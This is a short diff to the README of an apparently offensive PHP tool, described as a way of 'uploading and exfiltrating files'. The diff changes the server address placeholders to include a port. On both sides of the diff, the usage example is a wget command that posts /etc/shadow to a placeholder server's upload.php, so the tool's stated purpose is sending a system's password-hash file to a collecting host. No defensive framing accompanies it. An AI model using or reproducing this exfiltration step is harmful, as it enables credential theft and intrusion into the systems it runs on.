@@ -5,7 +5,7 @@ A secure and efficient solution for uploading and exfiltrating files using PHP.
 1. Host the "upload.php" file on your server.
 
 ```
-php -S <server_ip>:8080 -t .
+php -S <server_ip>:<port> -t .
 ```
 2. Create the "upload" directory and configure its settings.
 
@@ -27,7 +27,7 @@ useradd dummy && chown dummy upload
 To upload a file to the server, use the following method as an example:
 
 ```
-wget --post-file=/etc/shadow <server_ip>/upload.php?file=shadow
+wget --post-file=/etc/shadow <server_ip>:<port>/upload.php?file=shadow
 ```
 
-Replace `<server_ip>` with the IP address of your server and adjust the file path as needed.
+Replace `<server_ip>:<port>` with the IP address of your server and listening port.
